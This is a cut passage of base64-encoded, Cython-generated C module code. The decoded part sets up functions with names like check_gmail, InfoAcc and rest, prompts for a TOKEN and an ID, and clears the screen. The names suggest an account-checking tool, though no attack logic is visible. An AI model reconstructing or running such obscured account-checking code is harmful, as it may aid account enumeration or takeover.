nVpbHRpbl9wcmludDsgCiAgX19weXhfdF8yID0gX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFfMzltLCA2MCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIF9fcHl4X3RfMn07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzF9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJhd18xdGluZm8sIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW5mbywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGluZm8sIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzggPSAoX19QeXhfUHlVbmljb2RlX0VxdWFscyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOCA8IDApKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF84KSB7CgogICAgCiAgICBfX3B5eF90XzcgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW5mbyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDk5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF82ID0gMTsKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07CiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOTksIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgIAogIH0KCiAgCiAgX19weXhfdF80ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9pbnB1dCk7CiAgX19weXhfdF83ID0gX19weXhfYnVpbHRpbl9pbnB1dDsgCiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yM307CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UT0tFTiwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfNyA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfNCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfMiA9IF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzM5bSwgNjApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdF8yfTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMDIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBfX3B5eF90XzIgPSBfX3B5eF9idWlsdGluX2lucHV0OyAKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzI0fTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTAzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0lELCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTAzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXJ9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMDUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yYXdfM3BwcHAsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcHBwLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls0XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJhd181dXBkYXRlX3N0YXRzLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXBkYXRlX3N0YXRzLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMTcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXBkYXRlX3N0YXRzLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmF3XzdHaG9zdCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0LCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3QsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzcgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxNzMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE3MywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJhd185Y2hlY2tfZ21haWwsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVja19nbWFpbCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbN10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTc2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrX2dtYWlsLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTc2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmF3XzExY2hlY2ssIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVjaywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmF3XzEzcmVzdCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Jlc3QsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI1MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXN0LCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjUzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmF3XzE1SW5mb0FjYywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEwXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJhd18xN0dob3N0cHksIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdHB5LCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzk0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0cHksIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yYXdfMTlzdGF0c19sb29wLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RhdHNfbG9vcCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGF0c19sb29wLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF80ID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RocmVhZCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGF0c19sb29wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfNCwgTlVMTH07CiAgICBfX3B5eF90XzEwID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhf